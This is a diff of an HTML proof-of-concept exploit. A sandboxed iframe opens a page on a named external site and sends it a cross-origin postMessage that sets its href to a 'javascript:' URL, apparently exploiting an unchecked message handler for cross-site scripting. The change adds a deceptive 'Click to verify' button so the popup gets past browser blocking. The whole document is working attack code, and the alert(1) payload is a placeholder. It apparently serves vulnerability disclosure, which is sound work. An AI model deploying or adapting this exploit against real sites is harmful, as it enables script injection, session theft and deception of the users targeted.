@@ -9,14 +9,17 @@
     <h1>POC</h1>
 
     <iframe sandbox="allow-scripts allow-forms allow-popups" srcdoc="
+        &lt;button id='go'>Click to verify&lt;/button>
         &lt;script>
-            var target = window.open('https://daemoon.me/test.html', '_blank' );
-            setTimeout(function() {
-                target.postMessage(JSON.stringify({
-  action: 'href',
-  url: 'javascript:alert(1)'
-}), '*');
-            }, 3000);
+            document.getElementById('go').addEventListener('click', function() {
+                var target = window.open('https://daemoon.me/test.html', '_blank');
+                setTimeout(function() {
+                    target.postMessage(JSON.stringify({
+                        action: 'href',
+                        url: 'javascript:alert(1)'
+                    }), '*');
+                }, 3000);
+            });
         &lt;/script>
     "></iframe>
 
